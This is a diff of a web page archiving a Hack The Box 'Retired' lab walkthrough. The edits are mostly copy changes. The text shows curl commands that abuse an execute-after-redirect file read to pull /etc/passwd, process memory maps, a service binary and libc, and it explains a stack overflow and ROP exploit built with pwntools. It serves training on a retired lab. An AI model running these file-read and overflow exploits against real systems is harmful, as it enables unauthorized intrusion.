@@ -4,36 +4,35 @@
 1a:I[484,[],"OutletBoundary"]
 1b:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-retired-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Retired Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Retired machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:46:58.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[18," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-retired-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Retired machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Retired machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/retired","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","recon-port-scanning",{"children":["$","a",null,{"href":"#recon-port-scanning","children":"Recon — Port Scanning"}]}],["$","li","web-enumeration",{"children":["$","a",null,{"href":"#web-enumeration","children":"Web Enumeration"}]}],["$","li","file-read-vulnerability",{"children":["$","a",null,{"href":"#file-read-vulnerability","children":"File Read Vulnerability"}]}],["$","li","finding-the-activate-license-binary",{"children":["$","a",null,{"href":"#finding-the-activate-license-binary","children":"Finding the activate_license Binary"}]}],["$","li","leaking-memory-addresses",{"children":["$","a",null,{"href":"#leaking-memory-addresses","children":"Leaking Memory Addresses"}]}],"$L4","$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc"]}]]}],"$Ld"],"$Le","$Lf",["$L10","$L11","$L12"]]}],"$L13"]}]]}],"$L14"]}],"$L15","$L16"],null,"$L17"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Retired Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Execute-after-redirect file reads leaked the license service binary and live memory map for a ROP foothold, a backup symlink exposed dev's SSH key, and a capable helper registered a binfmt_misc rule that inherited root from a setuid binary."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:46:58.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[18," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-retired-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Retired machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Retired machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/retired","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","recon-port-scanning",{"children":["$","a",null,{"href":"#recon-port-scanning","children":"Recon: Port Scanning"}]}],["$","li","web-enumeration",{"children":["$","a",null,{"href":"#web-enumeration","children":"Web Enumeration"}]}],["$","li","file-read-vulnerability",{"children":["$","a",null,{"href":"#file-read-vulnerability","children":"File Read Vulnerability"}]}],["$","li","finding-the-activate-license-binary",{"children":["$","a",null,{"href":"#finding-the-activate-license-binary","children":"Finding the activate_license Binary"}]}],["$","li","leaking-memory-addresses",{"children":["$","a",null,{"href":"#leaking-memory-addresses","children":"Leaking Memory Addresses"}]}],"$L4","$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc"]}]]}],"$Ld"],"$Le","$Lf",["$L10","$L11","$L12"]]}],"$L13"]}]]}],"$L14"]}],"$L15","$L16"],null,"$L17"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
 4:["$","li","downloading-libraries",{"children":["$","a",null,{"href":"#downloading-libraries","children":"Downloading Libraries"}]}]
 5:["$","li","building-the-buffer-overflow-exploit",{"children":["$","a",null,{"href":"#building-the-buffer-overflow-exploit","children":"Building the Buffer Overflow Exploit"}]}]
 6:["$","li","shell-as-www-data",{"children":["$","a",null,{"href":"#shell-as-www-data","children":"Shell as www-data"}]}]
-7:["$","li","privilege-escalation-www-data-to-dev",{"children":["$","a",null,{"href":"#privilege-escalation-www-data-to-dev","children":"Privilege Escalation — www-data to dev"}]}]
-8:["$","li","ssh-as-dev-user-flag",{"children":["$","a",null,{"href":"#ssh-as-dev-user-flag","children":"SSH as dev — User Flag"}]}]
-9:["$","li","privilege-escalation-dev-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-dev-to-root","children":"Privilege Escalation — dev to root"}]}]
+7:["$","li","privilege-escalation-www-data-to-dev",{"children":["$","a",null,{"href":"#privilege-escalation-www-data-to-dev","children":"Privilege Escalation: www-data to dev"}]}]
+8:["$","li","ssh-as-dev-user-flag",{"children":["$","a",null,{"href":"#ssh-as-dev-user-flag","children":"SSH as dev: User Flag"}]}]
+9:["$","li","privilege-escalation-dev-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-dev-to-root","children":"Privilege Escalation: dev to root"}]}]
 a:["$","li","root-flag",{"children":["$","a",null,{"href":"#root-flag","children":"Root Flag"}]}]
 b:["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]
 c:["$","li","full-command-reference",{"children":["$","a",null,{"href":"#full-command-reference","children":"Full Command Reference"}]}]
-d:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",15," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-hacker-mindset",{"children":["$","a",null,{"href":"#the-hacker-mindset","children":"The Hacker Mindset"}]}],["$","li","recon-port-scanning",{"children":["$","a",null,{"href":"#recon-port-scanning","children":"Recon — Port Scanning"}]}],["$","li","web-enumeration",{"children":["$","a",null,{"href":"#web-enumeration","children":"Web Enumeration"}]}],["$","li","file-read-vulnerability",{"children":["$","a",null,{"href":"#file-read-vulnerability","children":"File Read Vulnerability"}]}],["$","li","finding-the-activate-license-binary",{"children":["$","a",null,{"href":"#finding-the-activate-license-binary","children":"Finding the activate_license Binary"}]}],["$","li","leaking-memory-addresses",{"children":["$","a",null,{"href":"#leaking-memory-addresses","children":"Leaking Memory Addresses"}]}],["$","li","downloading-libraries",{"children":["$","a",null,{"href":"#downloading-libraries","children":"Downloading Libraries"}]}],["$","li","building-the-buffer-overflow-exploit",{"children":["$","a",null,{"href":"#building-the-buffer-overflow-exploit","children":"Building the Buffer Overflow Exploit"}]}],["$","li","shell-as-www-data",{"children":["$","a",null,{"href":"#shell-as-www-data","children":"Shell as www-data"}]}],["$","li","privilege-escalation-www-data-to-dev",{"children":["$","a",null,{"href":"#privilege-escalation-www-data-to-dev","children":"Privilege Escalation — www-data to dev"}]}],["$","li","ssh-as-dev-user-flag",{"children":["$","a",null,{"href":"#ssh-as-dev-user-flag","children":"SSH as dev — User Flag"}]}],["$","li","privilege-escalation-dev-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-dev-to-root","children":"Privilege Escalation — dev to root"}]}],["$","li","root-flag",{"children":["$","a",null,{"href":"#root-flag","children":"Root Flag"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}],["$","li","full-command-reference",{"children":["$","a",null,{"href":"#full-command-reference","children":"Full Command Reference"}]}]]}]}]]}]
-e:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/cd3259d63fc166894b18ff580f683cc1bb6516fc/HTB-Retired.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · cd3259d63fc1",""]}]]]}]
-f:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Retired"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/retired","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+d:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",14," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","recon-port-scanning",{"children":["$","a",null,{"href":"#recon-port-scanning","children":"Recon: Port Scanning"}]}],["$","li","web-enumeration",{"children":["$","a",null,{"href":"#web-enumeration","children":"Web Enumeration"}]}],["$","li","file-read-vulnerability",{"children":["$","a",null,{"href":"#file-read-vulnerability","children":"File Read Vulnerability"}]}],["$","li","finding-the-activate-license-binary",{"children":["$","a",null,{"href":"#finding-the-activate-license-binary","children":"Finding the activate_license Binary"}]}],["$","li","leaking-memory-addresses",{"children":["$","a",null,{"href":"#leaking-memory-addresses","children":"Leaking Memory Addresses"}]}],["$","li","downloading-libraries",{"children":["$","a",null,{"href":"#downloading-libraries","children":"Downloading Libraries"}]}],["$","li","building-the-buffer-overflow-exploit",{"children":["$","a",null,{"href":"#building-the-buffer-overflow-exploit","children":"Building the Buffer Overflow Exploit"}]}],["$","li","shell-as-www-data",{"children":["$","a",null,{"href":"#shell-as-www-data","children":"Shell as www-data"}]}],["$","li","privilege-escalation-www-data-to-dev",{"children":["$","a",null,{"href":"#privilege-escalation-www-data-to-dev","children":"Privilege Escalation: www-data to dev"}]}],["$","li","ssh-as-dev-user-flag",{"children":["$","a",null,{"href":"#ssh-as-dev-user-flag","children":"SSH as dev: User Flag"}]}],["$","li","privilege-escalation-dev-to-root",{"children":["$","a",null,{"href":"#privilege-escalation-dev-to-root","children":"Privilege Escalation: dev to root"}]}],["$","li","root-flag",{"children":["$","a",null,{"href":"#root-flag","children":"Root Flag"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}],["$","li","full-command-reference",{"children":["$","a",null,{"href":"#full-command-reference","children":"Full Command Reference"}]}]]}]}]]}]
+e:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/cd3259d63fc166894b18ff580f683cc1bb6516fc/HTB-Retired.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit cd3259d63fc1",""]}]]]}]
+f:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Retired, Linux, Medium",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/retired","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 10:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Retired machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-11:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+11:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
 12:["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This archive preserves that context and does not claim independent reproduction of every documented path."}],null]}]
-18:T8300,
-<p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.227.96</p>
-<hr />
+18:T7f9d,<p><strong>Difficulty:</strong> Medium | <strong>OS:</strong> Linux | <strong>IP:</strong> 10.129.227.96</p>
+<hr>
 
 
 
-<h2 id="the-hacker-mindset">The Hacker Mindset</h2>
-<p>Before diving in, understand how hackers think. Every step follows the same loop:</p>
+
+<p>Start with how hackers think. Every step follows the same loop:</p>
 <pre><code>ENUMERATE → UNDERSTAND → IDENTIFY WEAKNESS → EXPLOIT → PIVOT → REPEAT
 </code></pre>
-<p>You are not randomly trying things. You are building a mental model of the target system and looking for places where assumptions break down — places where a developer trusted user input, where a script runs with too many privileges, or where memory is not properly bounded.</p>
-<p>Every piece of information you gather is ammunition. A username, a file path, a process ID — these all matter.</p>
-<hr />
-<h2 id="recon-port-scanning">Recon — Port Scanning</h2>
+<p>You are not randomly trying things. You are building a mental model of the target system and looking for places where assumptions break down - places where a developer trusted user input, where a script runs with too many privileges, or where memory is not properly bounded.</p>
+<p>Every piece of information you gather is ammunition. A username, a file path, a process ID - these all matter.</p>
+<hr>
+<h2 id="recon-port-scanning">Recon: Port Scanning</h2>
 <h3 id="what-we-ran">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.96
 nmap -p 22,80 -sCV 10.129.227.96
@@ -42,16 +41,16 @@ nmap -p 22,80 -sCV 10.129.227.96
 <pre><code>22/tcp open  ssh
 80/tcp open  http (nginx)
 </code></pre>
-<h3 id="why-we-do-this">Why we do this</h3>
+
 <p>The very first question is: <strong>what attack surface exists?</strong> A port is a door. We need to know which doors are open before we can try to walk through one.</p>
 <ul>
 <li><code>-p-</code> scans ALL 65535 ports (not just the common 1000). Boxes often run services on non-standard ports.</li>
 <li><code>--min-rate 10000</code> speeds up the scan on a lab network where we don't care about noise.</li>
 <li><code>-sCV</code> on the discovered ports runs version detection (<code>-sV</code>) and default scripts (<code>-sC</code>) to extract banners, software versions, and other metadata.</li>
 </ul>
-<h3 id="hacker-mindset">Hacker mindset</h3>
-<p>Two ports means a small attack surface. SSH (port 22) is usually not directly exploitable without credentials. HTTP (port 80) is almost always the entry point — web applications are complex, developer-written, and full of bugs. <strong>Start with the web.</strong></p>
-<hr />
+
+<p>Two ports means a small attack surface. SSH (port 22) is usually not directly exploitable without credentials. HTTP (port 80) is almost always the entry point - web applications are complex, developer-written, and full of bugs. <strong>Start with the web.</strong></p>
+<hr>
 <h2 id="web-enumeration">Web Enumeration</h2>
 <h3 id="what-we-observed">What we observed</h3>
 <p>Visiting <code>http://10.129.227.96/</code> redirects to:</p>
@@ -63,14 +62,14 @@ nmap -p 22,80 -sCV 10.129.227.96
 <li>There is a <strong><code>page</code> parameter</strong> that controls what file is loaded</li>
 <li>The value is a filename: <code>default.html</code></li>
 </ul>
-<h3 id="why-this-matters">Why this matters</h3>
+
 <p>Any time you see a URL parameter that looks like a filename or path, think: <strong>Local File Inclusion (LFI)</strong>. The server is probably doing something like:</p>
 <pre><code class="language-php" data-language="php">readfile($_GET['page']);   // or include(), require(), etc.
 </code></pre>
-<p>If it's including or reading a file based on user input without proper sanitization, we might be able to make it read files it shouldn't — like <code>/etc/passwd</code> or SSH keys.</p>
-<h3 id="hacker-mindset-2">Hacker mindset</h3>
+<p>If it's including or reading a file based on user input without proper sanitization, we might be able to make it read files it shouldn't - like <code>/etc/passwd</code> or SSH keys.</p>
+
 <p>A URL parameter named <code>page</code> that takes a filename is a classic sign of <strong>path traversal / LFI</strong>. This is one of the most common web vulnerabilities because developers often need to build templated pages and take shortcuts.</p>
-<hr />
+<hr>
 <h2 id="file-read-vulnerability">File Read Vulnerability</h2>
 <h3 id="testing-the-vulnerability">Testing the vulnerability</h3>
 <pre><code class="language-bash" data-language="bash">curl "http://10.129.227.96/index.php?page=/etc/passwd"
@@ -106,16 +105,16 @@ readfile($page);
 <li>Requiring the path to start with a lowercase letter (<code>^[a-z]</code>)</li>
 <li>Stripping <code>../</code> and <code>./</code></li>
 </ol>
-<p>But when we pass <code>/etc/passwd</code>, the regex check FAILS (starts with <code>/</code>), yet <code>readfile()</code> is still called after the redirect header is set. PHP sends the redirect header but continues executing — this is called <strong>Execute After Redirect (EAR)</strong>.</p>
+<p>But when we pass <code>/etc/passwd</code>, the regex check FAILS (starts with <code>/</code>), yet <code>readfile()</code> is still called after the redirect header is set. PHP sends the redirect header but continues executing - this is called <strong>Execute After Redirect (EAR)</strong>.</p>
 <p>The server sends a 302 redirect but ALSO sends the file contents in the response body. <code>curl</code> follows redirects by default, but by reading the raw response, we get the file.</p>
 <h3 id="what-we-learned-from-etc-passwd">What we learned from /etc/passwd</h3>
 <ul>
 <li>Username: <strong>dev</strong> with home <code>/home/dev</code></li>
 <li>This will be our target user</li>
 </ul>
-<h3 id="hacker-mindset-3">Hacker mindset</h3>
+
 <p>Never trust a redirect. Many web frameworks and custom PHP code redirect on error but forget to call <code>exit()</code> or <code>die()</code> after setting the redirect header. The response body still contains the result of the remaining code. Always intercept traffic in Burp or check raw responses with <code>curl</code> without <code>-L</code> to see what's really being returned.</p>
-<hr />
+<hr>
 <h2 id="finding-the-activate-license-binary">Finding the activate_license Binary</h2>
 <h3 id="reading-activate-license-php">Reading activate_license.php</h3>
 <pre><code class="language-bash" data-language="bash">curl "http://10.129.227.96/index.php?page=activate_license.php"
@@ -146,19 +145,19 @@ if(isset($_FILES['licensefile'])) {
 <h3 id="why-proc-matters">Why /proc matters</h3>
 <p>On Linux, the <code>/proc</code> filesystem is a virtual filesystem that exposes the kernel's internal state. For every running process, there is a folder <code>/proc/[PID]/</code> containing:</p>
 <ul>
-<li><code>cmdline</code> — what command was used to start it</li>
-<li><code>maps</code> — what memory regions the process has mapped</li>
-<li><code>fd/</code> — open file descriptors</li>
-<li><code>exe</code> — symlink to the executable</li>
+<li><code>cmdline</code> : what command was used to start it</li>
+<li><code>maps</code> : what memory regions the process has mapped</li>
+<li><code>fd/</code> : open file descriptors</li>
+<li><code>exe</code> : symlink to the executable</li>
 </ul>
-<p>This is a goldmine when you have arbitrary file read, because <code>/proc</code> exposes live runtime information about every process on the system.</p>
+<p>This is a useful source when you have arbitrary file read, because <code>/proc</code> exposes live runtime information about every process on the system.</p>
 <h3 id="downloading-the-binary">Downloading the binary</h3>
 <pre><code class="language-bash" data-language="bash">curl "http://10.129.227.96/index.php?page=/usr/bin/activate_license" -o activate_license
 </code></pre>
-<p>We can download the binary itself because our file read has no content-type restriction. The binary is just bytes on disk — we can exfiltrate it.</p>
-<h3 id="hacker-mindset-4">Hacker mindset</h3>
-<p>When you have file read, think beyond just <code>/etc/passwd</code> and SSH keys. The entire filesystem is readable. Running processes expose their binaries, config files, memory maps, and environment variables through <code>/proc</code>. If there's a custom service running, <strong>download its binary</strong> — you can reverse engineer it locally.</p>
-<hr />
+<p>We can download the binary itself because our file read has no content-type restriction. The binary is just bytes on disk - we can exfiltrate it.</p>
+
+<p>When you have file read, think beyond just <code>/etc/passwd</code> and SSH keys. The entire filesystem is readable. Running processes expose their binaries, config files, memory maps, and environment variables through <code>/proc</code>. If there's a custom service running, <strong>download its binary</strong> - you can reverse engineer it locally.</p>
+<hr>
 <h2 id="leaking-memory-addresses">Leaking Memory Addresses</h2>
 <h3 id="getting-the-memory-map">Getting the memory map</h3>
 <pre><code class="language-bash" data-language="bash">curl -s "http://10.129.227.96/index.php?page=/proc/429/maps"
@@ -194,19 +193,19 @@ if(isset($_FILES['licensefile'])) {
 </tr>
 </tbody></table>
 <h3 id="why-these-addresses-matter">Why these addresses matter</h3>
-<p>Modern Linux has <strong>ASLR (Address Space Layout Randomization)</strong> — every time a program starts, its libraries are loaded at random addresses. This is a security mitigation designed to make exploits harder: you can't hardcode an address like <code>system()</code> because it changes on every run.</p>
-<p>BUT — on this machine, <code>activate_license</code> is a forking server. The main process starts once and forks (copies itself) to handle each connection. When you <code>fork()</code>, the child gets an <strong>exact copy of the parent's memory layout</strong>. The addresses in the fork are identical to the parent.</p>
+<p>Modern Linux has <strong>ASLR (Address Space Layout Randomization)</strong> - every time a program starts, its libraries are loaded at random addresses. This is a security mitigation designed to make exploits harder: you can't hardcode an address like <code>system()</code> because it changes on every run.</p>
+<p>BUT - on this machine, <code>activate_license</code> is a forking server. The main process starts once and forks (copies itself) to handle each connection. When you <code>fork()</code>, the child gets an <strong>exact copy of the parent's memory layout</strong>. The addresses in the fork are identical to the parent.</p>
 <p>This means: <strong>if we can read the maps of the parent process, the child process that handles our exploit connection will have those same addresses.</strong> ASLR is defeated.</p>
-<h3 id="hacker-mindset-5">Hacker mindset</h3>
+
 <p>ASLR is not unbreakable. Any information leak that tells you where a library is loaded in memory defeats ASLR. Here, the combination of file read + <code>/proc/[pid]/maps</code> gives us a precise memory map of the live process. This is exactly what we need to build a working exploit.</p>
-<hr />
+<hr>
 <h2 id="downloading-libraries">Downloading Libraries</h2>
 <pre><code class="language-bash" data-language="bash">curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so
 curl -s "http://10.129.227.96/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6
 </code></pre>
 <h3 id="why-we-need-these">Why we need these</h3>
-<p>To build a ROP chain (explained next), we need gadgets — small sequences of instructions that end with <code>ret</code>. These gadgets exist inside the libraries the program uses. We need the <strong>exact library files from the target machine</strong> (not our local copies) because the offsets of gadgets differ between versions and builds.</p>
-<hr />
+<p>To build a ROP chain (explained next), we need gadgets - small sequences of instructions that end with <code>ret</code>. These gadgets exist inside the libraries the program uses. We need the <strong>exact library files from the target machine</strong> (not our local copies) because the offsets of gadgets differ between versions and builds.</p>
+<hr>
 <h2 id="building-the-buffer-overflow-exploit">Building the Buffer Overflow Exploit</h2>
 <h3 id="the-vulnerability">The vulnerability</h3>
 <p>From reversing <code>activate_license</code> (either with Ghidra or reading the writeup):</p>
@@ -217,7 +216,7 @@ read(sockfd, &amp;msglen, 4);         // read 4 bytes for length
 msglen = ntohl(msglen);
 read(sockfd, buffer, msglen);     // read MSGLEN bytes into 512-byte buffer!
 </code></pre>
-<p>The server reads a 4-byte length, converts it to a number, then reads that many bytes into a fixed 512-byte buffer. If we say the message is 1024 bytes long, we write 1024 bytes into a 512-byte buffer — <strong>classic stack buffer overflow</strong>.</p>
+<p>The server reads a 4-byte length, converts it to a number, then reads that many bytes into a fixed 512-byte buffer. If we say the message is 1024 bytes long, we write 1024 bytes into a 512-byte buffer - <strong>classic stack buffer overflow</strong>.</p>
 <h3 id="why-there-s-no-easy-path">Why there's no easy path</h3>
 <p>Running <code>checksec</code> on the binary reveals:</p>
 <pre><code>RELRO:    Full RELRO
@@ -226,10 +225,10 @@ NX:       NX enabled
 PIE:      PIE enabled
 </code></pre>
 <ul>
-<li><strong>No stack canary</strong> — good for us, the overflow won't be detected</li>
-<li><strong>NX enabled</strong> — bad for us, we cannot execute shellcode directly on the stack</li>
-<li><strong>PIE enabled</strong> — binary loads at random addresses (but we defeated this with the maps leak)</li>
-<li><strong>Full RELRO</strong> — GOT is read-only, no GOT overwrite attacks</li>
+<li><strong>No stack canary</strong> : good for us, the overflow won't be detected</li>
+<li><strong>NX enabled</strong> : bad for us, we cannot execute shellcode directly on the stack</li>
+<li><strong>PIE enabled</strong> : binary loads at random addresses (but we defeated this with the maps leak)</li>
+<li><strong>Full RELRO</strong> : GOT is read-only, no GOT overwrite attacks</li>
 </ul>
 <p>Because NX is enabled, we need <strong>Return Oriented Programming (ROP)</strong>.</p>
 <h3 id="what-is-rop">What is ROP?</h3>
@@ -251,7 +250,7 @@ PIE:      PIE enabled
 <ul>
 <li><code>RDI = stack_start</code> (first argument)</li>
 <li><code>RSI = stack_size</code> (second argument)</li>
-<li><code>RDX = 7</code> (third argument — rwx permissions)</li>
+<li><code>RDX = 7</code> (third argument - rwx permissions)</li>
 <li>Then call <code>mprotect</code></li>
 </ul>
 <p>We use pwntools to find ROP gadgets automatically from the libraries we downloaded.</p>
@@ -300,33 +299,33 @@ requests.post('http://10.129.227.96/activate_license.php',
 </code></pre>
 <h3 id="why-offset-520">Why offset = 520?</h3>
 <p>The buffer is 512 bytes, plus 8 bytes of saved RBP = 520 bytes before we reach the return address. We confirmed this with GDB pattern analysis.</p>
-<h3 id="hacker-mindset-6">Hacker mindset</h3>
